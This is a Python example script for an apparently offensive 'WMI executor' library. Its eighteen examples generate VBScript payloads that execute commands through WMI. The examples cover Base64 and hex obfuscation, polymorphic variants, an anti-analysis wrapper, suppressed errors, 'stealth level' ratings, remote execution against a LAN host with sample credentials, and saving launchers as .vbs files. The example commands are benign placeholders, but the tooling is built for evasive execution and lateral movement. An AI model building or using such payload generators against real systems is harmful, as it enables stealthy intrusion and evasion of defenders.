#!/usr/bin/env python3
"""
WMI Executor Examples
Comprehensive examples of all WMI execution methods
"""

from wmi_executor import (
    create_wmi_executor, generate_wmi_payload,
    ExecutionConfig, WMIExecutor
)
import json


def example_1_basic_locator():
    """Example 1: Basic SWbemLocator execution"""
    print("\n" + "="*80)
    print("EXAMPLE 1: Basic SWbemLocator Direct Method")
    print("="*80)

    executor = create_wmi_executor()
    payload = executor.generate_locator_method("calc.exe")

    print("\nCommand: calc.exe")
    print("\nGenerated VBS Payload:")
    print(payload)


def example_2_powershell_execution():
    """Example 2: PowerShell command execution"""
    print("\n" + "="*80)
    print("EXAMPLE 2: PowerShell Execution via WMI")
    print("="*80)

    executor = create_wmi_executor()
    ps_command = 'powershell -NoProfile -Command "Write-Host Hello World"'
    payload = executor.generate_locator_method(ps_command)

    print(f"\nCommand: {ps_command}")
    print("\nGenerated VBS Payload:")
    print(payload)


def example_3_obfuscated_base64():
    """Example 3: Base64 obfuscated payload"""
    print("\n" + "="*80)
    print("EXAMPLE 3: Obfuscated Base64 Payload")
    print("="*80)

    executor = create_wmi_executor()
    command = "cmd.exe /c whoami"
    payload = executor.generate_obfuscated_wmi_payload(command, encoding="base64")

    print(f"\nCommand: {command}")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNote: Command is Base64 encoded and decoded at runtime")


def example_4_obfuscated_hex():
    """Example 4: Hex obfuscated payload"""
    print("\n" + "="*80)
    print("EXAMPLE 4: Obfuscated Hex Payload")
    print("="*80)

    executor = create_wmi_executor()
    command = "cmd.exe /c echo test"
    payload = executor.generate_obfuscated_wmi_payload(command, encoding="hex")

    print(f"\nCommand: {command}")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNote: Command is Hex encoded and decoded at runtime")


def example_5_event_sink():
    """Example 5: WMI Event Sink execution"""
    print("\n" + "="*80)
    print("EXAMPLE 5: WMI Event Sink Execution")
    print("="*80)

    executor = create_wmi_executor()
    payload = executor.generate_wmi_event_sink("calc.exe")

    print("\nCommand: calc.exe")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNote: Uses asynchronous event-driven execution")


def example_6_swbem_object_method():
    """Example 6: SWbemObject method invocation"""
    print("\n" + "="*80)
    print("EXAMPLE 6: SWbemObject Method Invocation")
    print("="*80)

    executor = create_wmi_executor()
    payload = executor.generate_swbem_object_method("cmd.exe")

    print("\nCommand: cmd.exe")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNote: Uses direct method invocation on WbemScripting.SWbemObject")


def example_7_timeout_method():
    """Example 7: WMI execution with timeout"""
    print("\n" + "="*80)
    print("EXAMPLE 7: WMI Execution with Timeout")
    print("="*80)

    executor = create_wmi_executor()
    payload = executor.generate_swbem_timeout_method("powershell.exe", timeout_seconds=60)

    print("\nCommand: powershell.exe")
    print("Timeout: 60 seconds")
    print("\nGenerated VBS Payload:")
    print(payload)


def example_8_registry_hybrid():
    """Example 8: WMI registry hybrid method"""
    print("\n" + "="*80)
    print("EXAMPLE 8: WMI Registry Hybrid Execution")
    print("="*80)

    executor = create_wmi_executor()
    command = "cmd.exe /c ipconfig"
    payload = executor.generate_wmi_registry_hybrid(command)

    print(f"\nCommand: {command}")
    print("\nGenerated VBS Payload:")
    print(payload)
    print("\nNote: Stores command in WMI registry, then executes")


def example_9_remote_execution():
    """Example 9: Remote WMI execution"""
    print("\n" + "="*80)
    print("EXAMPLE 9: Remote WMI Execution")
    print("="*80)

    executor = create_wmi_executor()
    payload = executor.generate_remote_wmi_execution(
        command="cmd.exe /c dir C:\\",
        remote_host="192.168.1.100",
        username="admin",
        password="SecurePass123"
    )

    print("\nCommand: cmd.exe /c dir C:\\")
    print("Target Host: 192.168.1.100")
    print("Username: admin")
    print("\nGenerated VBS Payload:")
    print(payload)


def example_10_polymorphic_variants():
    """Example 10: Polymorphic execution variants"""
    print("\n" + "="*80)
    print("EXAMPLE 10: Polymorphic WMI Execution Variants")
    print("="*80)

    executor = create_wmi_executor()
    command = "calc.exe"

    for i in range(4):
        print(f"\n--- Variant {i} ---")
        payload = executor.generate_polymorphic_wmi_executor(command, variant=i)
        print(payload)
        print()


def example_11_launcher_script():
    """Example 11: Complete launcher script"""
    print("\n" + "="*80)
    print("EXAMPLE 11: Complete Launcher Script with Wrapper")
    print("="*80)

    executor = create_wmi_executor()
    payload = executor.generate_wmi_launcher_script("calc.exe", add_wrapper=True)

    print("\nCommand: calc.exe")
    print("\nGenerated VBS Launcher Script:")
    print(payload)
    print("\nNote: Includes anti-analysis wrapper and proper error handling")


def example_12_custom_configuration():
    """Example 12: Custom configuration"""
    print("\n" + "="*80)
    print("EXAMPLE 12: Custom Execution Configuration")
    print("="*80)

    config = ExecutionConfig(
        use_locator=True,
        obfuscate_names=True,
        use_polymorphism=True,
        encode_command=True,
        hide_errors=True
    )

    executor = WMIExecutor(config)
    payload = executor.generate_locator_method("calc.exe")

    print("\nConfiguration:")
    print(f"  Use Locator: {config.use_locator}")
    print(f"  Obfuscate Names: {config.obfuscate_names}")
    print(f"  Use Polymorphism: {config.use_polymorphism}")
    print(f"  Encode Command: {config.encode_command}")
    print(f"  Hide Errors: {config.hide_errors}")

    print("\nGenerated VBS Payload:")
    print(payload)


def example_13_high_level_api():
    """Example 13: High-level payload generation API"""
    print("\n" + "="*80)
    print("EXAMPLE 13: High-Level API Usage")
    print("="*80)

    # Locator method
    print("\n[1] Locator Method:")
    payload = generate_wmi_payload("calc.exe", method="locator")
    print(payload[:150] + "...")

    # Query method
    print("\n[2] Query Method:")
    payload = generate_wmi_payload("cmd.exe", method="query")
    print(payload[:150] + "...")

    # Object method
    print("\n[3] Object Method:")
    payload = generate_wmi_payload("powershell.exe", method="object")
    print(payload[:150] + "...")

    # Event sink
    print("\n[4] Event Sink:")
    payload = generate_wmi_payload("cmd.exe", method="event")
    print(payload[:150] + "...")

    # Obfuscated
    print("\n[5] Obfuscated (Base64):")
    payload = generate_wmi_payload("calc.exe", method="obfuscated", encoding="base64")
    print(payload[:150] + "...")


def example_14_execution_report():
    """Example 14: Execution methods report"""
    print("\n" + "="*80)
    print("EXAMPLE 14: Execution Methods Report")
    print("="*80)

    executor = create_wmi_executor()
    report = executor.generate_execution_report()

    print("\nAvailable Execution Methods:\n")

    for method_key, method_info in report.items():
        print(f"Method: {method_info['name']}")
        print(f"  Key: {method_key}")
        print(f"  Description: {method_info['description']}")
        print(f"  Stealth Level: {method_info['stealth_level']}")
        print()


def example_15_batch_payload_generation():
    """Example 15: Generate multiple payloads"""
    print("\n" + "="*80)
    print("EXAMPLE 15: Batch Payload Generation")
    print("="*80)

    executor = create_wmi_executor()
    commands = [
        "calc.exe",
        "notepad.exe",
        "cmd.exe /c dir",
        "powershell.exe -NoProfile"
    ]

    print("\nGenerating payloads for multiple commands:\n")

    for i, cmd in enumerate(commands, 1):
        payload = executor.generate_locator_method(cmd)
        print(f"[{i}] Command: {cmd}")
        print(f"    Payload Length: {len(payload)} characters")
        print()


def example_16_comparison_methods():
    """Example 16: Compare different execution methods"""
    print("\n" + "="*80)
    print("EXAMPLE 16: Method Comparison")
    print("="*80)

    executor = create_wmi_executor()
    command = "calc.exe"

    methods = [
        ("Locator Method", executor.generate_locator_method),
        ("Query Method", executor.generate_swbem_query),
        ("Object Method", executor.generate_swbem_object_method),
        ("Event Sink", executor.generate_wmi_event_sink),
    ]

    print(f"\nComparing methods for command: {command}\n")

    for method_name, method_func in methods:
        payload = method_func(command)
        lines = payload.count('\n') + 1
        print(f"{method_name:20} - {len(payload):5} chars, {lines:2} lines")


def example_17_save_payload_to_file():
    """Example 17: Save payload to VBS file"""
    print("\n" + "="*80)
    print("EXAMPLE 17: Save Payload to VBS File")
    print("="*80)

    executor = create_wmi_executor()
    payload = executor.generate_wmi_launcher_script("calc.exe", add_wrapper=True)

    # In production, this would save to file
    print("\nPayload that would be saved:")
    print(payload)

    print("\n\nTo save to file in production:")
    print('  with open("wmi_payload.vbs", "w") as f:')
    print('      f.write(payload)')


def example_18_security_features():
    """Example 18: Security and stealth features"""
    print("\n" + "="*80)
    print("EXAMPLE 18: Security & Stealth Features")
    print("="*80)

    executor = create_wmi_executor()

    features = {
        "Error Suppression": executor.generate_swbem_object_method("calc.exe"),
        "Variable Obfuscation": executor.generate_locator_method("calc.exe"),
        "Command Encoding": executor.generate_obfuscated_wmi_payload("calc.exe", "base64"),
        "Polymorphic Variants": executor.generate_polymorphic_wmi_executor("calc.exe", 0),
    }

    print("\nSecurity Features Implemented:\n")

    for feature_name, payload in features.items():
        print(f"[{feature_name}]")
        if "On Error Resume Next" in payload:
            print("  ✓ Error suppression enabled")
        if "DecodeBase64Cmd" in payload or "DecodeHexCmd" in payload:
            print("  ✓ Command encoding enabled")
        if any(char.isdigit() for char in payload.split('_')[-1][:2]):
            print("  ✓ Variable name obfuscation")
        print()


def run_all_examples():
    """Run all examples"""
    examples = [
        example_1_basic_locator,
        example_2_powershell_execution,
        example_3_obfuscated_base64,
        example_4_obfuscated_hex,
        example_5_event_sink,
        example_6_swbem_object_method,
        example_7_timeout_method,
        example_8_registry_hybrid,
        example_9_remote_execution,
        example_10_polymorphic_variants,
        example_11_launcher_script,
        example_12_custom_configuration,
        example_13_high_level_api,
        example_14_execution_report,
        example_15_batch_payload_generation,
        example_16_comparison_methods,
        example_17_save_payload_to_file,
        example_18_security_features,
    ]

    for example_func in examples:
        try:
            example_func()
        except Exception as e:
            print(f"\nError in {example_func.__name__}: {e}")

    print("\n" + "="*80)
    print("All examples completed!")
    print("="*80)


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1:
        example_num = int(sys.argv[1])
        examples = [
            example_1_basic_locator,
            example_2_powershell_execution,
            example_3_obfuscated_base64,
            example_4_obfuscated_hex,
            example_5_event_sink,
            example_6_swbem_object_method,
            example_7_timeout_method,
            example_8_registry_hybrid,
            example_9_remote_execution,
            example_10_polymorphic_variants,
            example_11_launcher_script,
            example_12_custom_configuration,
            example_13_high_level_api,
            example_14_execution_report,
            example_15_batch_payload_generation,
            example_16_comparison_methods,
            example_17_save_payload_to_file,
            example_18_security_features,
        ]
        if 1 <= example_num <= len(examples):
            examples[example_num - 1]()
        else:
            print(f"Example {example_num} not found. Choose 1-{len(examples)}")
    else:
        run_all_examples()
